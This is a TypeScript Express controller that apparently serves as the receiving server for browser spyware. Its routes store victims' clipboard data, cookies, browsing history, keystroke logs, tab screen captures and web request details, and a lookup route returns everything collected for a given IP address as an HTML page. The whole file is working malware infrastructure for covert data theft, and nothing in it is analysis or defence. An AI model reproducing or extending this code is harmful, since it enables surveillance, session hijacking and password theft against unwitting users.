import { Request, Response, Router } from 'express';

import Controller from '../interfaces/controller.interface';
import DataTypes from '../consts';
import InfoService from '../services/info.service';
import ClipboardService from '../services/clipboard.service';
import CookieService from '../services/cookies.service';
import HistoryService from '../services/history.service';
import KeystrokeService from '../services/keystrokes.service';
import TabCaptureService from '../services/tabCapture.service';
import fileMiddleware from '../middlewares/file.middleware';
import WebRequestService from '../services/webRequest.service';
import BulkRetrieverService from '../services/bulkRetriever.service';
import buildHtml from '../helpers/httpBuilder/httpBuilder';

interface MulterRequest extends Request {
  file: any;
}

class DataController implements Controller {
  public path = '/data';

  public router = Router();

  private infoService = new InfoService();

  private clipboardService = new ClipboardService();

  private cookieService = new CookieService();

  private historyService = new HistoryService();

  private keystrokeService = new KeystrokeService();

  private tabCaptureService = new TabCaptureService();

  private webRequestService = new WebRequestService();

  private bulkRetrieveService = new BulkRetrieverService();

  constructor() {
    this.initializeRoutes();
  }

  private initializeRoutes() {
    this.router.get(`${this.path}`, this.getDataInfo);
    this.router.get(`${this.path}/:ip`, this.getDataForIP);
    this.router.post(`${this.path}`, fileMiddleware, this.storeData);
  }

  private getDataInfo = async (request: Request, response: Response) => {
    try {
      return response.json(await this.infoService.getInfo());
    } catch {
      response.status(500);
      return response.json('Failed to retrieve data');
    }
  };

  private getDataForIP = async (request: Request, response: Response) => {
    try {
      const { ip } = request.params;
      return response.send((await buildHtml(await this.bulkRetrieveService.retrieveForIP(ip))));
    } catch {
      response.status(404);
      return response.json("Couldn't retrieve data for the given IP address");
    }
  };

  private storeData = async (request: Request, response: Response) => {
    try {
      const { endpoint } = request.query;
      if (endpoint != null) {
        switch (endpoint) {
          case DataTypes.CLIPBOARD:
            this.clipboardService.storeClipboardData(request.body, response.locals.lastid);
            return response.status(200).send();
          case DataTypes.COOKIES:
            this.cookieService.storeCookieData(request.body, response.locals.lastid);
            return response.status(200).send();
          case DataTypes.HISTORY:
            this.historyService.storeHistoryData(request.body, response.locals.lastid);
            return response.status(200).send();
          case DataTypes.KEYSTROKES:
            this.keystrokeService.storeKeystrokeBuffer(request.body, response.locals.lastid);
            return response.status(200).send();
          case DataTypes.TAB_CAPTURE:
            const fileBuffer = (request as MulterRequest).file.buffer;
            this.tabCaptureService.storeTabCapture(fileBuffer, response.locals.lastid);
            return response.status(200).send();
          case DataTypes.WEB_REQUESTS:
            const buffer = Buffer.from(JSON.stringify(request.body.details));
            this.webRequestService.storeWebRequest({ requestInfo: buffer }, response.locals.lastid);
            return response.status(200).send();
          default:
            return response.json('Invalid endpoint');
        }
      }
      response.status(400);
      return response.send('Bad Request');
    } catch (err: any) {
      console.log(err);
      response.status(500);
      return response.send('Internal server error');
    }
  };
}

export default DataController;
